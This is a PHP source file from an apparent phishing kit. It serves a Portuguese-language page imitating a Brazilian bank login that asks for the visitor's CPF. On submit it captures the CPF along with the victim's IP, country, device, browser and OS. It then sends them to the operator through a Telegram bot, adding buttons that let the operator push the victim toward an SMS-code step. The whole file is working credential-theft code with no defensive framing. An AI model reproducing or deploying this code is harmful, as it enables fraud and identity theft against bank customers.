<?php 
session_start();
ob_start();
require_once('../includes/php/detect.php');
require_once('../config.php');


if($_SERVER['REQUEST_METHOD'] == 'POST'){
    if(!empty($_POST['user'])){

$_SESSION['unique_id'] = $_SERVER['REQUEST_TIME_FLOAT'];


$_SESSION['cpf_counter']++;

$_SESSION['user'] = $_POST['user'];


$buttons = array(
    'inline_keyboard' => array(
        array(
        array('text' => '👤 CPF AGAIN', 'callback_data' => $_SESSION['unique_id'] . $_SESSION['cpf_counter'] . ' cpf_again'),
        ),
        array(
        array('text' => '📲 SMS AUTH', 'callback_data' => $_SESSION['unique_id'] . $_SESSION['cpf_counter'] . ' sms'),
        ),
    )
);

include_once('../includes/php/bot_api.php');

$message = '<b>👤 CPF from</b> <code>'.$_SESSION['user_data']['query'].'</code>

<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>DEVICE:</b> '.$_SESSION['device'].'
<b>BROWSER:</b> '.$_SESSION['browser'].'
<b>OS:</b> '.$_SESSION['os'].'

<b>CPF:</b> <code>'.trim($_SESSION['user']).'</code>';
  
$status = bot_api($message, $buttons);
if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');

header('location: checks/user.php');
exit();
}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="css/app.css">
</head>
<body>
    <div id="app">
        <header class="txtcenter">
            <div>
                <img src="img/logo.png" alt="">
            </div>
            <div>
                <span class="blue class-1"></span>
            </div>
        </header>
        <main>
            <form  action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post" autocomplete="off">
                <div style="margin-bottom: 60px;"><span class="grey">Informe seu CPF e clique em "Próximo" para continuar:</span></div>
                <div id="error" class="<?php if(!isset($_SESSION['cpf_err'])) echo 'hidden'; ?>"><span>CPF Inválido</span></div>
                <div class="form-group">
                    <input class="grey" type="tel" name="user" id="user" placeholder=" ">
                    <label class="label grey" for="user"><svg xmlns="http://www.w3.org/2000/svg" width="15" fill="#4C556C" viewBox="0 0 448 512"><path d="M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z"/></svg>CPF</label>
                </div>
                <button type="submit">Próximo</button>
                <div style="padding-bottom: 20px;" class="txtcenter blue">É novo por aqui?</div>
                <div class="txtcenter blue underline">Cadastre-se e abra a sua conta</div>
            </form>
        </main>
        <footer>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="#0066b3" width="28"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM169.8 165.3c7.9-22.3 29.1-37.3 52.8-37.3h58.3c34.9 0 63.1 28.3 63.1 63.1c0 22.6-12.1 43.5-31.7 54.8L280 264.4c-.2 13-10.9 23.6-24 23.6c-13.3 0-24-10.7-24-24V250.5c0-8.6 4.6-16.5 12.1-20.8l44.3-25.4c4.7-2.7 7.6-7.7 7.6-13.1c0-8.4-6.8-15.1-15.1-15.1H222.6c-3.4 0-6.4 2.1-7.5 5.3l-.4 1.2c-4.4 12.5-18.2 19-30.6 14.6s-19-18.2-14.6-30.6l.4-1.2zM224 352a32 32 0 1 1 64 0 32 32 0 1 1 -64 0z"/></svg>
            <span class="blue underline">Preciso de ajuda</span>
        </footer>
    </div>
    <script src="js/index.js"></script>
    <script src="js/label.js"></script>
    <script src="js/jquery.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script>$("#user").mask("000.000.000-00");</script>
</body>
</html>